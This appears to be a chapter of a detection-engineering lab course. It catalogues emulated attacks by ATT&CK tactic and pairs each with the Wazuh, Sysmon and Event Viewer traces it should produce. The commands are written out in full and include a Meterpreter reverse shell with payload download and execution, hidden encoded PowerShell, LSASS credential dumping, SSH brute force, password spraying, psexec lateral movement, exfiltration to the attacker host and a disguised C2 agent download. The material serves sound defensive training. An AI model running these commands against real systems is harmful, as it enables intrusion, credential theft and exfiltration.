# 09 — Attack Simulation Catalog

**Where:** Kali (`10.10.10.100`) as attacker; Windows/Linux victims as targets. Watch results in Wazuh.
**Feeds course topics:** 9.2 (technique mapping), 9.4 (hunts), 9.5 (rule validation), 9.6 (the APT chain).

**Goal:** a menu of **safe, repeatable** attacks organized by ATT&CK tactic. Each entry says how to run it, what telemetry it produces (Event Viewer / Sysmon / Wazuh), and which rule it validates.

---

## Read this first — why we emulate instead of detonating real malware

You asked about running famous malware like **Stuxnet/"Stuxbot"**. For a teaching lab the correct approach is **adversary emulation**, not live malware. Here's the reasoning to share with students:

- **Real malware is uncontrollable.** Worms like Stuxnet self-propagate and can escape a lab; ransomware destroys data irreversibly. Even snapshots don't make distribution/handling of live samples safe or legal in a course setting.
- **The learning objective is the *traces*, not the damage.** Detection engineering cares about the **behaviors** (ATT&CK techniques) an attack produces in Event Viewer, Sysmon, and Wazuh. Emulation reproduces those exact behaviors safely.
- **This is how professionals do it.** Atomic Red Team, MITRE Caldera, and manual TTP execution are the industry-standard way to test detections.

So in Doc 10 we build a **"Stuxbot" APT scenario** — a *named, emulated* intrusion that chains the techniques below. It generates realistic traces without any real self-propagating malware. The one "malware-like" artifact we use is a **msfvenom payload we generated ourselves** (Doc 04), which is fully under our control.

> [!WARNING]
> Snapshot every victim as `pre-attack` before running anything here. Keep NAT off. Run only against your own lab VMs.

---



## Tactic 0 — Reconnaissance & Discovery

**From Kali:**

```bash
nmap -sС -sV -Pn 10.10.10.20            # service/version scan of Windows victim
nmap -p- --min-rate 2000 10.10.10.20    # full port sweep
enum4linux -a 10.10.10.20               # SMB enumeration
crackmapexec smb 10.10.10.20            # SMB info / signing
```

**Telemetry:** Windows firewall/Security logs, Sysmon EID 3 (network). **Wazuh:** connection spikes, port-scan patterns.
**ATT&CK:** T1046, T1018, T1590.

---



## Tactic 1 — Initial Access & Execution



### 1a. Malicious download + reverse shell (your own payload)

**On Kali:** serve the payload and start the handler (from Doc 04):

```bash
cd /tmp && python3 -m http.server 8080
# separate shell:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.100; set LPORT 4444; exploit -j"
```

**On the Windows victim** (simulating a user opening a phishing attachment):

```powershell
Invoke-WebRequest http://10.10.10.100:8080/invoice.exe -OutFile $env:USERPROFILE\Downloads\invoice.exe
& $env:USERPROFILE\Downloads\invoice.exe
```

**Telemetry:** Sysmon EID 1 (process create w/ hash), EID 3 (network to 4444), EID 11 (file write). **Wazuh:** rule **100340** (C2:4444), FIM if in a watched folder.
**ATT&CK:** T1204 (User Execution), T1105 (Ingress Tool Transfer), T1571 (Non-Standard Port).

### 1b. Malicious macro behavior (Office → shell)

```powershell
Invoke-AtomicTest T1566.001 -TestNumbers 1
# or simulate the child-process pattern directly:
Invoke-AtomicTest T1204.002 -TestNumbers 1
```

**Wazuh:** rule **100310** (Office spawns shell). **ATT&CK:** T1566.001, T1059.

### 1c. Malicious PowerShell

```powershell
powershell -nop -w hidden -enc <base64>       # encoded command
Invoke-AtomicTest T1059.001
```

**Wazuh:** rule **100320**. **ATT&CK:** T1059.001.

---



## Tactic 2 — Persistence

```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1    # Registry Run key
Invoke-AtomicTest T1053.005 -TestNumbers 1    # Scheduled task
Invoke-AtomicTest T1543.003 -TestNumbers 1    # New Windows service
```

**Telemetry:** Sysmon EID 13 (registry), EID 1 (schtasks.exe/sc.exe), Security 4698 (task created), 7045 (service installed). **Wazuh:** persistence-group alerts.
**ATT&CK:** T1547.001, T1053.005, T1543.003.

---



## Tactic 3 — Privilege Escalation

```powershell
Invoke-AtomicTest T1548.002 -TestNumbers 1    # UAC bypass
Invoke-AtomicTest T1134 -TestNumbers 1        # token manipulation
```

**Telemetry:** Sysmon EID 1 lineage, Security 4672/4673. **ATT&CK:** T1548.002, T1134.

---



## Tactic 4 — Credential Access



### 4a. LSASS dumping

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 1
```

Or from a Meterpreter session on Kali:

```
load kiwi
creds_all
```

**Telemetry:** Sysmon EID 10 (process access to lsass.exe). **Wazuh:** rule **100301** (T1003.001).

### 4b. SSH brute force (Linux victim)

**From Kali:**

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.30 -t 4 -f
```

**Telemetry:** `/var/log/auth.log`. **Wazuh:** built-in 5710 + your correlation rule **100350** (T1110).

### 4c. SMB password spray

```bash
crackmapexec smb 10.10.10.20 -u users.txt -p 'Password1!' --continue-on-success
```

**Telemetry:** Security 4625 (failed logon). **ATT&CK:** T1110.

---



## Tactic 5 — Lateral Movement

**From Kali (with creds/hashes from Tactic 4):**

```bash
impacket-psexec administrator:'Password1!'@10.10.10.20
impacket-wmiexec administrator:'Password1!'@10.10.10.20
crackmapexec smb 10.10.10.20 -u administrator -p 'Password1!' -x "whoami"
```

**Telemetry:** Security 4624 type 3 (network logon), 5140 (share access), Sysmon EID 1 (psexesvc), EID 3. **ATT&CK:** T1021.002, T1570, T1569.002.

---



## Tactic 6 — Collection & Exfiltration

```powershell
Invoke-AtomicTest T1005 -TestNumbers 1        # data from local system
Invoke-AtomicTest T1560.001 -TestNumbers 1    # archive collected data
```

**From victim, exfil to Kali:**

```powershell
Invoke-WebRequest -Uri http://10.10.10.100:8080/upload -Method POST -InFile C:\loot.zip
```

**Telemetry:** Sysmon EID 11 (archive created), EID 3 (outbound). **ATT&CK:** T1005, T1560, T1041.

---



## Tactic 7 — Command & Control (automated, Caldera)

Instead of hand-running everything, deploy a Caldera agent for realistic multi-step C2 (this is the backbone of Doc 10).

**On the Windows victim**, fetch the Sandcat agent from your Caldera server (Kali):

```powershell
$server="http://10.10.10.100:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
[io.file]::WriteAllBytes("C:\Users\Public\svchost.exe",$data);
Start-Process "C:\Users\Public\svchost.exe" -ArgumentList "-server $server -group red"
```

In the Caldera UI, run an **operation** with an adversary profile (e.g. Discovery, or a chained profile). Each ability = one ATT&CK technique executed and logged.
**ATT&CK:** T1071, plus whatever the profile runs.

---



## Attack → Telemetry → Rule reference table


| #     | Attack          | Sysmon EID | Event Viewer      | Wazuh rule  | ATT&CK      |
| ----- | --------------- | ---------- | ----------------- | ----------- | ----------- |
| Recon | nmap/enum4linux | 3          | Security/Firewall | conn spikes | T1046       |
| 1a    | reverse shell   | 1,3,11     | 4688              | 100340      | T1204/T1571 |
| 1b    | Office→shell    | 1          | 4688              | 100310      | T1566.001   |
| 1c    | PowerShell      | 1          | 4104 (PS)         | 100320      | T1059.001   |
| 2     | persistence     | 1,13       | 4698/7045         | persistence | T1547/T1053 |
| 4a    | LSASS dump      | 10         | —                 | 100301      | T1003.001   |
| 4b    | SSH brute       | —          | auth.log          | 5710/100350 | T1110       |
| 5     | psexec/wmiexec  | 1,3        | 4624/5140         | lateral     | T1021.002   |
| 6     | exfil           | 11,3       | —                 | C2/FIM      | T1041       |


---



## Verify

- [ ] Each attack you run appears in **all relevant sources** (Event Viewer, Sysmon, Wazuh).
- [ ] The mapped Wazuh rule fires (validates Doc 08).
- [ ] The MITRE dashboard shows the technique (validates Doc 05).
- [ ] You cleaned up (`Invoke-AtomicTest <T#> -Cleanup`) or rolled back to `pre-attack`.

---

> [!NOTE]
> **Recording checkpoint:** This is a **reference catalog**, not a single lecture. Use it to source live demos for 9.2/9.4/9.5. The full **cinematic run-through is the APT case study in Doc 10 (Lesson 9.6)**.

Next: [10 — APT Case Study: "Stuxbot"](10-apt-case-study-stuxbot.md)